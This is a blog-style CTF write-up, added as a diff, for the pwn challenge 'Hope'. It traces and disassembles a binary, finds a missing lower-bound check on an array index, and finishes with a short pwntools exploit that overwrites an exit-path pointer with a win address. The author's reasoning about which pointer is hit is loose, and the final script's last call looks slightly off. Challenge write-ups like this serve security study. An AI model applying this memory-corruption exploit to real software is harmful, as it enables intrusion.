@@ -1,0 +1,409 @@
+---
+title: CM CTF 2025 - Hope
+description: A medium pwn challenge writeup.
+date: "2025-07-24"
+---
+
+![first](/blog-post-1.jpg)
+
+## Let's get Cracking...
+
+This blog has a pwn challenge writeup that I solved at a recent national level CTF.
+
+Following file was given to us a lead to solve the challenge.
+
+```console
+~/Downloads/pwn ❯ tree
+.
+└── hope
+
+1 directory, 1 file
+~/Downloads/pwn ❯ file hope
+hope: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
+dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
+BuildID[sha1]=9e9920e6eb161f0ee40de853d38ffad7488f06e7, 
+for GNU/Linux 3.2.0, not stripped
+```
+
+## Initial observations:
+
+Firstly, I ran `strace` and `ltrace` to extract some basic info related to the binary.
+
+```bash
+~/Downloads/pwn ❯ ltrace ./hope                                                                                                                                 11:09:44 AM
+setbuf(0x76a99e6038e0, 0)                                                                                 = <void>
+setbuf(0x76a99e6045c0, 0)                                                                                 = <void>
+printf("index: "index: )                                                                                         = 7
+__isoc99_scanf(0x40201f, 0x7ffd1491400c, 0, 02
+)                                                            = 1
+printf("value: "value: )                                                                                         = 7
+__isoc99_scanf(0x40201f, 0x7ffd14914010, 0, 02
+)                                                            = 1
+printf("slot[%d] = %d\n", 0, 0slot[0] = 0
+)                                                                           = 12
+printf("slot[%d] = %d\n", 1, 0slot[1] = 0
+)                                                                           = 12
+printf("slot[%d] = %d\n", 2, 2slot[2] = 2
+)                                                                           = 12
+printf("slot[%d] = %d\n", 3, 0slot[3] = 0
+)                                                                           = 12
+printf("slot[%d] = %d\n", 4, 0slot[4] = 0
+)                                                                           = 12
+printf("slot[%d] = %d\n", 5, 0slot[5] = 0
+)                                                                           = 12
+printf("slot[%d] = %d\n", 6, 0slot[6] = 0
+)                                                                           = 12
+printf("slot[%d] = %d\n", 7, 0slot[7] = 0
+)                                                                           = 12
+printf("slot[%d] = %d\n", 8, 0slot[8] = 0
+)                                                                           = 12
+printf("slot[%d] = %d\n", 9, 0slot[9] = 0
+)                                                                           = 12
+exit(0 <no return ...>
++++ exited (status 0) +++
+~/Downloads/pwn ❯ ltrace ./hope                                                                                                                              6s 11:12:40 AM
+setbuf(0x7d44e7a038e0, 0)                                                                                 = <void>
+setbuf(0x7d44e7a045c0, 0)                                                                                 = <void>
+printf("index: "index: )                                                                                         = 7
+__isoc99_scanf(0x40201f, 0x7ffdc168b5ac, 0, 011
+)                                                            = 1
+puts("[-] out-of-bounds"[-] out-of-bounds
+)                                                                                 = 18
+exit(1 <no return ...>
++++ exited (status 1) +++
+~/Downloads/pwn ❯ strace ./hope                                                                                                                                 11:12:52 AM
+execve("./hope", ["./hope"], 0x7ffc60a56e40 /* 61 vars */) = 0
+brk(NULL)                               = 0x3e6ce000
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x71c984def000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=138583, ...}) = 0
+mmap(NULL, 138583, PROT_READ, MAP_PRIVATE, 3, 0) = 0x71c984dcd000
+close(3)                                = 0
+openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
+pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+fstat(3, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
+pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
+mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x71c984a00000
+mmap(0x71c984a28000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x71c984a28000
+mmap(0x71c984bb0000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0x71c984bb0000
+mmap(0x71c984bff000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1fe000) = 0x71c984bff000
+mmap(0x71c984c05000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x71c984c05000
+close(3)                                = 0
+mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x71c984dca000
+arch_prctl(ARCH_SET_FS, 0x71c984dca740) = 0
+set_tid_address(0x71c984dcaa10)         = 11050
+set_robust_list(0x71c984dcaa20, 24)     = 0
+rseq(0x71c984dcb060, 0x20, 0, 0x53053053) = 0
+mprotect(0x71c984bff000, 16384, PROT_READ) = 0
+mprotect(0x403000, 4096, PROT_READ)     = 0
+mprotect(0x71c984e27000, 8192, PROT_READ) = 0
+prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+munmap(0x71c984dcd000, 138583)          = 0
+write(1, "index: ", 7index: )                  = 7
+read(0, 10
+"1", 1)                         = 1
+read(0, "0", 1)                         = 1
+read(0, "\n", 1)                        = 1
+write(1, "[-] out-of-bounds", 17[-] out-of-bounds)       = 17
+write(1, "\n", 1
+)                       = 1
+exit_group(1)                           = ?
++++ exited with 1 +++
+```
+
+I know its all very random but it what it is : ) Following is the info that I have extracted from the these outputs.
+
+- The program first prompts for an index and then for a value.
+- Uses scanf (`__isoc99_scanf`) to receive integer input.
+- If the input index is greater than a certain value, it triggers: `puts("[-] out-of-bounds")` and exits with `exit(1)`.
+- If index is within range (e.g., `2`), it sets `slot[2] = <value>` and prints all slot values (`slot[0]` to `slot[9]`), with only one slot being changed.
+- `setbuf(stdout, 0)` and `setbuf(stderr, 0)` are used to disable buffering.
+- There is a statically sized array (`slot[10]`) storing integers.
+- There is a strict bounds check in place preventing buffer overflow exploits (you can’t go beyond `slot[9]`).
+- The index check seems to be working correctly; trying to enter index `10` results in an "`out-of-bounds`" error and exit.
+
+## Potential Vulnerability:
+Upper bound is properly implemented with in the binary but upon entering any negative input the binary runs normally, which shows that there is no lower bound in place. This immediately suggests an array index vulnerability, specifically a signedness bug, where negative indexes are not properly checked.
+
+```console
+~/Downloads/pwn ❯ ./hope
+index: -4
+value: 12345
+slot[0] = 0
+slot[1] = 0
+slot[2] = 0
+slot[3] = 0
+slot[4] = 0
+slot[5] = 0
+slot[6] = 0
+slot[7] = 0
+slot[8] = 0
+slot[9] = 0
+```
+
+## Exploitation:
+First, I opened the binary in Ghidra to analyse the decompiled `main()` function.
+
+![image](/static/images/pwn1.png)
+
+```C
+void main(void)
+
+{
+  long in_FS_OFFSET;
+  int local_1c;
+  undefined4 local_18;
+  uint local_14;
+  undefined8 local_10;
+  
+  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
+  setbuf(stdin,(char *)0x0);
+  setbuf(stdout,(char *)0x0);
+  printf("index: ");
+  __isoc99_scanf(&DAT_0040201f,&local_1c);
+  if (9 < local_1c) {
+    puts("[-] out-of-bounds");
+    FUN_004010e0(1);
+  }
+  printf("value: ");
+  __isoc99_scanf(&DAT_0040201f,&local_18);
+  *(undefined4 *)(slot + (long)local_1c * 4) = local_18;
+  for (local_14 = 0; (int)local_14 < 10; local_14 = local_14 + 1) {
+    printf("slot[%d] = %d\n",(ulong)local_14,(ulong)*(uint *)(slot + >
+    (long)(int)local_14 * 4));
+  }
+  FUN_004010e0(0);
+                  
+  halt_baddata();
+}
+```
+
+Now let’s extract the address of `main()` function using `GDB`
+
+```console
+~/Downloads/pwn ❯ gdb ./hope
+GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
+Copyright (C) 2024 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later 
+<http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./hope...
+(No debugging symbols found in ./hope)
+(gdb) info address main
+Symbol "main" is at 0x401231 in a file compiled without debugging.
+```
+
+Now we’ll disassemble `main()`
+
+```console
+(gdb) disassemble 0x401231
+Dump of assembler code for function main:
+   0x0000000000401231 <+0>: endbr64
+   0x0000000000401235 <+4>: push   %rbp
+   0x0000000000401236 <+5>: mov    %rsp,%rbp
+   0x0000000000401239 <+8>: sub    $0x20,%rsp
+   0x000000000040123d <+12>: mov    %fs:0x28,%rax
+   0x0000000000401246 <+21>: mov    %rax,-0x8(%rbp)
+   0x000000000040124a <+25>: xor    %eax,%eax
+   0x000000000040124c <+27>: mov    0x2dfd(%rip),%rax
+   0x0000000000401253 <+34>: mov    $0x0,%esi
+   0x0000000000401258 <+39>: mov    %rax,%rdi
+   0x000000000040125b <+42>: call   0x4010a0 <setbuf@plt>
+   0x0000000000401260 <+47>: mov    0x2dd9(%rip),%rax
+   0x0000000000401267 <+54>: mov    $0x0,%esi
+   0x000000000040126c <+59>: mov    %rax,%rdi
+   0x000000000040126f <+62>: call   0x4010a0 <setbuf@plt>
+   0x0000000000401274 <+67>: lea    0xd9c(%rip),%rax
+   0x000000000040127b <+74>: mov    %rax,%rdi
+   0x000000000040127e <+77>: mov    $0x0,%eax
+   0x0000000000401283 <+82>: call   0x4010b0 <printf@plt>
+   0x0000000000401288 <+87>: lea    -0x14(%rbp),%rax
+   0x000000000040128c <+91>: mov    %rax,%rsi
+   0x000000000040128f <+94>: lea    0xd89(%rip),%rax
+   0x0000000000401296 <+101>: mov    %rax,%rdi
+   0x0000000000401299 <+104>: mov    $0x0,%eax
+   0x000000000040129e <+109>: call   0x4010d0 <__isoc99_scanf@plt>
+   0x00000000004012a3 <+114>: mov    -0x14(%rbp),%eax
+   0x00000000004012a6 <+117>: cmp    $0x9,%eax
+   0x00000000004012a9 <+120>: jle    0x4012c4 <main+147>
+   0x00000000004012ab <+122>: lea    0xd70(%rip),%rax
+   0x00000000004012b2 <+129>: mov    %rax,%rdi
+   0x00000000004012b5 <+132>: call   0x401090 <puts@plt>
+   0x00000000004012ba <+137>: mov    $0x1,%edi
+   0x00000000004012bf <+142>: call   0x4010e0 <exit@plt>
+   0x00000000004012c4 <+147>: lea    0xd69(%rip),%rax
+   0x00000000004012cb <+154>: mov    %rax,%rdi
+   0x00000000004012ce <+157>: mov    $0x0,%eax
+   0x00000000004012d3 <+162>: call   0x4010b0 <printf@plt>
+   0x00000000004012d8 <+167>: lea    -0x10(%rbp),%rax
+   0x00000000004012dc <+171>: mov    %rax,%rsi
+   0x00000000004012df <+174>: lea    0xd39(%rip),%rax
+--Type <RET> for more, q to quit, c to continue without paging--
+   0x00000000004012e6 <+181>: mov    %rax,%rdi
+   0x00000000004012e9 <+184>: mov    $0x0,%eax
+   0x00000000004012ee <+189>: call   0x4010d0 <__isoc99_scanf@plt>
+   0x00000000004012f3 <+194>: mov    -0x14(%rbp),%edx
+   0x00000000004012f6 <+197>: mov    -0x10(%rbp),%eax
+   0x00000000004012f9 <+200>: movslq %edx,%rdx
+   0x00000000004012fc <+203>: lea    0x0(,%rdx,4),%rcx
+   0x0000000000401304 <+211>: lea    0x2d55(%rip),%rdx
+   0x000000000040130b <+218>: mov    %eax,(%rcx,%rdx,1)
+   0x000000000040130e <+221>: movl   $0x0,-0xc(%rbp)
+   0x0000000000401315 <+228>: jmp    0x40134b <main+282>
+   0x0000000000401317 <+230>: mov    -0xc(%rbp),%eax
+   0x000000000040131a <+233>: cltq
+   0x000000000040131c <+235>: lea    0x0(,%rax,4),%rdx
+   0x0000000000401324 <+243>: lea    0x2d35(%rip),%rax
+   0x000000000040132b <+250>: mov    (%rdx,%rax,1),%edx
+   0x000000000040132e <+253>: mov    -0xc(%rbp),%eax
+   0x0000000000401331 <+256>: mov    %eax,%esi
+   0x0000000000401333 <+258>: lea    0xd02(%rip),%rax
+   0x000000000040133a <+265>: mov    %rax,%rdi
+   0x000000000040133d <+268>: mov    $0x0,%eax
+   0x0000000000401342 <+273>: call   0x4010b0 <printf@plt>
+   0x0000000000401347 <+278>: addl   $0x1,-0xc(%rbp)
+   0x000000000040134b <+282>: cmpl   $0x9,-0xc(%rbp)
+   0x000000000040134f <+286>: jle    0x401317 <main+230>
+   0x0000000000401351 <+288>: mov    $0x0,%edi
+   0x0000000000401356 <+293>: call   0x4010e0 <exit@plt>
+End of assembler dump.
+```
+
+The array `slot[10]` starts at memory address `0x404060`.
+
+```
+0x404060 <slot>
+```
+
+So we’ll use this as our value with different negative values as the index value to locate the `.fini_array[0]`. `4197590 = 0x4011d6` so we’ll `4197590` as value.
+
+```console
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/n0tabdu11ah/Downloads/pwn/hope 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+index: -7
+value: 4197590
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7c6b531 in __vfprintf_internal 
+(s=0x400cd6f7e045c0, format=0x40203c 
+"slot[%d] = %d\n", ap=ap@entry=0x7fffffffdb00, 
+mode_flags=mode_flags@entry=0)
+    at ./stdio-common/vfprintf-internal.c:1525
+warning: 1525 ./stdio-common/vfprintf-internal.c: No such file or directory
+```
+
+Your write to `index: -7` with value `4197590` (`0x4011d6`) caused a segmentation fault inside `vfprintf()`, which is used by `printf()`.
+
+```console
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/n0tabdu11ah/Downloads/pwn/hope 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+index: -8
+value: 4197590
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7c6b531 in __vfprintf_internal (s=0x7fff00400cd6, 
+format=0x40203c "slot[%d] = %d\n", ap=ap@entry=0x7fffffffdb00, 
+mode_flags=mode_flags@entry=0)
+    at ./stdio-common/vfprintf-internal.c:1525
+warning: 1525 ./stdio-common/vfprintf-internal.c: No such file or directory
+```
+
+At this point we have definitely corrupting memory used by `printf()`'s internal logic — specifically the file stream pointer (`FILE *s`).
+
+```console
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/n0tabdu11ah/Downloads/pwn/hope 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+index: -13
+value: 4197590
+slot[0] = 0
+slot[1] = 0
+slot[2] = 0
+slot[3] = 0
+slot[4] = 0
+slot[5] = 0
+slot[6] = 0
+slot[7] = 0
+slot[8] = 0
+slot[9] = 0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004010e4 in exit@plt ()
+```
+
+This means that I have overwrote something that `exit()` tried to use. Since it crashed inside `exit@plt`, this strongly suggests you’ve hit `.fini_array` or a return pointer used by `exit()`.
+
+```console
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/n0tabdu11ah/Downloads/pwn/hope 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+index: -14
+value: 4197590
+slot[0] = 0
+slot[1] = 0
+slot[2] = 0
+slot[3] = 0
+slot[4] = 0
+slot[5] = 0
+slot[6] = 0
+slot[7] = 0
+slot[8] = 0
+slot[9] = 0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400cd6 in ?? ()
+```
+
+This suggests I overwritten a `.fini_array` entry or function pointer, but likely with a corrupted or partial address.
+
+## Exploit Code:
+Following is the final exploit that I used to extract the flag from the challenge instance. Running the following gave me the flag.
+
+```python3
+from pwn import *
+
+host = "172.168.32.10"
+port = 1337
+
+win_addr = 0x4011d6
+
+io = remote(host, port)
+
+io.sendlineafter("index:", "-14")
+io.sendlineafter("value:", str(win_addr))
+
+interactive()
+```
+
+I hope that you liked this blog and I’ll see you in the next one. Stay in the loop with my latest content – follow me on [Medium](https://medium.com/@iabdullah_215) for more!
+
+## THANKS
+
+## MUHAMMAD ABDULLAH
